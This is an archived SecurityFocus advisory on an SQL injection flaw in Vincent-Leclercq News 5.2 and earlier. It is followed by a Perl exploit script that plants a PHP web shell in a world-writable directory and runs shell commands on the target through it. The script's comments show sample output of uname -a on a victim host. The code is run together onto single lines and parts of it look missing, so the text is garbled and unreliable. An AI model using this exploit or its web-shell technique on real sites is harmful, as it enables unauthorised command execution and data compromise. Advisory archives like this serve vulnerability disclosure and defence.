source: http://www.securityfocus.com/bid/18729/info

Vincent-Leclercq News is prone to an SQL-injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.

An attacker may be able to exploit this issue to modify the logic of SQL queries. Successful exploits may allow the attacker to compromise the software, retrieve information, or modify data; other consequences are possible as well.

#!/usr/bin/perl 
# 
# VulnScr: News version 5.2 and prior 
# E-mail: contact@vincent-leclercq.com 
# Web: www.vincent-leclercq.com # 
# Date: Thu June 29 12:01 2006 
# Credits: DarkFig (gmdarkfig@gmail.com) 
# Vuln: XSS, Full Path Disclosure, SQL Injection 
# Advisorie: http://www.acid-root.new.fr/advisories/news52.txt (french =)) 
# Exploit: Create a php file (system($cmd)) in a dir ((smileys)chmoded 777 during the installation of the script) 
# # # +-----------------------------------------+ 
# | News <= 5.2 SQL Injection (cmd exec) ---| 
# +-----------------------------------------+ 
# [+]Full path: OK [/home/www/victim/news52] 
# [+]Prefix: OK [news_] # [+]File exist: OK 
# [localhost]uname -a # Linux ws6 2.6.16-SE-k8 
#6 SMP PREEMPT Thu May 11 18:19:55 UTC 2006 i686 GNU/Linux 
# [localhost]exit 
# +-----------------------------------------+ 
# use LWP::UserAgent; use LWP::Simple; use Getopt::Long; 
# # Argvs # header(); if(!$ARGV[1]){ &usageis; } GetOptions( 'host=s' => \$host, 'path=s' => \$path, ); if($host =~ /http:\/\/(.*)/){ $host = $1; } 
# # Vars # my $helurl = 'http://'.$host.$path; my $uagent = 'Perlnamigator'; my $timeut = '30'; my $errr00 = "[-]Can't connect to the host\n"; my $errr01 = "[-]Can't get the full path of the website\n"; my $errr02 = "[-]Can't get the table prefix\n"; my $errr03 = "[-]The php file doesn't exist\n"; if($cmd eq "exit"){ &the_end; } $req5 = get($helurl.'admin/smileys/hello.php?cmd='.$cmd) or print $errr00 and the_end(); print $req5, "\n"; } sub usageis { print "| Usage: -host localhost -path /news/ ---| \n"; &the_end; } sub the_end { print "+-----------------------------------------+\n"; exit; } sub header { print "\n+-----------------------------------------+\n"; print "| News <= 5.2 SQL Injection (cmd exec) ---|\n"; print "+-----------------------------------------+\n"; }